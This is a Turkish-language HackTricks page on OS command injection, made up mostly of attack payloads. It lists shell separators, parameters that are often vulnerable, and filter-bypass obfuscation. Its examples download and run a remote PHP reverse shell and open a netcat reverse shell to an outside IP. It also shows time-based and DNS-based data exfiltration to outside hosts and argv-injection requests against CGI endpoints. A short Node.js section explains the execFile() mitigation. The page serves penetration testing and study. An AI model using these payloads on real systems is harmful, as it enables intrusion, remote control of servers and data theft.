# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection nedir?

A **command injection**, bir saldırganın uygulamayı barındıran sunucuda rastgele işletim sistemi komutları çalıştırmasına izin verir. Sonuç olarak uygulama ve tüm verileri tamamen ele geçirilebilir. Bu komutların çalıştırılması genellikle saldırganın uygulamanın çalışma ortamı ve altında yatan sistem üzerinde yetkisiz erişim veya kontrol sağlamasına yol açar.

### Bağlam

**Girişinizin nereye enjekte edildiğine** bağlı olarak, komutlardan önce **tırnaklı bağlamı sonlandırmanız** (using `"` or `'`) gerekebilir.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limition** Bypasses

Eğer bir linux makinesi içinde **keyfi komutlar** çalıştırmaya çalışıyorsanız, bu **Bypasses** hakkında okumak ilginizi çekecektir:


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Örnekler**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Parametreler

İşte code injection ve benzeri RCE zafiyetlerine açık olabilecek ilk 25 parametre (kaynak: [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Veri çıkarma: karakter karakter
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS tabanlı data exfiltration

`https://github.com/HoLyVieR/dnsbin` kaynağındaki araca dayanmaktadır; ayrıca dnsbin.zhack.ca adresinde barındırılmaktadır.
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS based data exfiltration'ı kontrol etmek için çevrimiçi araçlar:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

JavaScript/TypeScript arka uçlarını denetlerken sıklıkla Node.js `child_process` API'siyle karşılaşacaksınız.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` bir **shell** (`/bin/sh -c`) başlatır; bu yüzden shell'e özel anlam taşıyan herhangi bir karakter (back-ticks, `;`, `&&`, `|`, `$()`, …) kullanıcı girdisi string'e eklenirse **command injection** ile sonuçlanır.

**Önlem:** `execFile()` kullanın (veya `spawn()`'ı `shell` seçeneği olmadan) ve her argümanı ayrı bir dizi öğesi olarak sağlayın, böylece herhangi bir shell devreye girmez:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Tüm injectionlar shell metacharacters gerektirmez. Uygulama, güvenilmeyen stringleri bir sistem aracına argüman olarak geçiriyorsa (hatta `execve`/`execFile` ve no shell ile), birçok program `-` veya `--` ile başlayan herhangi bir argümanı yine de seçenek (option) olarak çözer. Bu, bir saldırganın modları çevirmesine, çıktı yollarını değiştirmesine veya asla bir shell'e çıkmadan tehlikeli davranışları tetiklemesine izin verir.

Tipik olarak bunun görüldüğü yerler:

- Gömülü web UIs/CGI handler'ları veya `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>` gibi komutları kuran CGI işleyicileri.
- Merkezi CGI yönlendiriciler (ör. `/cgi-bin/<something>.cgi` ve `topicurl=<handler>` gibi bir selector parametresi) — birden fazla handler aynı zayıf doğrulayıcıyı yeniden kullandığında.

Denenecekler:

- Aşağı akış aracının flag olarak tüketeceği `-`/`--` ile başlayan değerler sağlayın.
- Davranışı değiştiren veya dosya yazan flag'leri kötüye kullanın, örneğin:
  - `ping`: cihazı zorlamak için `-f`/`-c 100000` (DoS)
  - `curl`: rastgele yollar yazmak için `-o /tmp/x`, saldırgan kontrollü config yüklemek için `-K <url>`
  - `tcpdump`: güvenli olmayan wrapper'larda post-rotate yürütme elde etmek için `-G 1 -W 1 -z /path/script.sh`
- Program `--` end-of-options'u destekliyorsa, `--`'ü yanlış yere ekleyen naif mitigasyonları aşmayı deneyin.

Merkezi CGI dispatcher'lara karşı genel PoC şekilleri:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force Algılama Listesi


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## Referanslar

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
